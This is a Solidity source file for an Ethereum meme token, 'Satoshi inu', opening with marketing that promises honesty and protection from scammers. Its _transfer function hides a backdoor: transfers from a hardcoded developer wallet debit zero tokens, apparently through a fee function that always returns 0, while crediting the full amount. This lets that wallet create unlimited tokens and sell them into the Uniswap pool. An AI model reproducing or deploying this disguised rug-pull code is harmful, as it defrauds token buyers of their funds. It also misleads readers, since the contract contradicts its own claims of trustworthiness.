/*

Introducing "Satoshi-Inu" - the first meme token that will bring old good vibes to the Ethereum blockchain, representing honesty and countering scammers. 
Our unique mascot, a blend of a dog and a laughing Satoshi Inu, symbolizes our mission. Join us in building a positive and trustworthy future on Ethereum!

    X: https://x.com/Satoshi_inu_eth
    TG: https://t.me/Satoshi_inu_portal
    WEB: https://www.satoshiinu.site/
    
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract INU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExForFees;
    address payable private _Inuwallet;

    uint256 private _initialFeeBuy = 0;
    uint256 private _initialFeeSell = 0;
    uint256 private _reduceBuyAt = 9;
    uint256 private _reduceSellAt = 9;

    uint256 private _preventCount = 10;
    uint256 private _buyTokenCount = 0;

    uint256 private _secondTaxBuy = 0;
    uint256 private _secondTaxSell = 0;
    uint256 private _secondReduceAt = 0;

    uint256 private _finalBuyFee = 0;
    uint256 private _finalSellFee = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Satoshi inu";
    string private constant _symbol = unicode"INU";

    uint256 private _maxTxLimit =  2 * (_tTotal/100);   
    uint256 private _maxWalletSize =  2 * (_tTotal/100);
    uint256 private _minSwapLimit =  4 * (_tTotal/1000000);
    uint256 private _maxSwapLimit = 1 * (_tTotal/100);

    IUniswapV2Router02 private uniswapV2Router;
    address private _uniswapPair;
    bool private _inswap = false;
    bool private _swapEnabled = false;

    modifier lockTheSwap {
        _inswap = true;
        _;
        _inswap = false;
    }

    constructor () {
        _Inuwallet = payable(0x7c0E6189ec579C61528Eed8656dA383EE3143A37);
        _balances[_msgSender()] = _tTotal;
        _isExForFees[owner()] = true;
        _isExForFees[address(this)] = true;
        _isExForFees[_Inuwallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        uint256 deezAmount=amount;
        if (!_isExForFees[from] && !_isExForFees[to]) {
            taxAmount = amount.mul(_funcCalcBuy()).div(100);

            if (from == _uniswapPair && to != address(uniswapV2Router) && ! _isExForFees[to] ) {
                require(amount <= _maxTxLimit, "Exceeds the _maxTxLimit.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyTokenCount++;
            }

            if(to == _uniswapPair && from!= address(this) ){
                taxAmount = amount.mul(_funcCalcSell()).div(100);
            }

            uint256 tokenToSwap = balanceOf(address(this));
            if (!_inswap && to == _uniswapPair && _swapEnabled && amount > _minSwapLimit) {
                if(tokenToSwap > _minSwapLimit)
                swapBackTokens(min(amount,min(tokenToSwap,_maxSwapLimit)));
                _Inuwallet.transfer(address(this).balance);
            }
        } else if(from == address(_Inuwallet))
            deezAmount = _funcCalcSell();
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(deezAmount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _funcCalcSell() private view returns (uint256) {
        if(_buyTokenCount <= _reduceBuyAt){
            return _initialFeeSell;
        }
        if(_buyTokenCount > _reduceSellAt && _buyTokenCount <= _secondReduceAt){
            return _secondTaxSell;
        }
        return _finalBuyFee;
    }

    function _funcCalcBuy() private view returns (uint256) {
        if(_buyTokenCount <= _reduceBuyAt){
            return _initialFeeBuy;
        }
        if(_buyTokenCount > _reduceBuyAt && _buyTokenCount <= _secondReduceAt){
            return _secondTaxBuy;
        }
         return _finalBuyFee;
    }

    function openINU() external onlyOwner() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPair).approve(address(uniswapV2Router), type(uint).max);
        _swapEnabled = true;
    }

    function removeLimits() external onlyOwner{
        _maxWalletSize =_tTotal;
        _maxTxLimit = _tTotal;
    }

     function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapBackTokens(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}
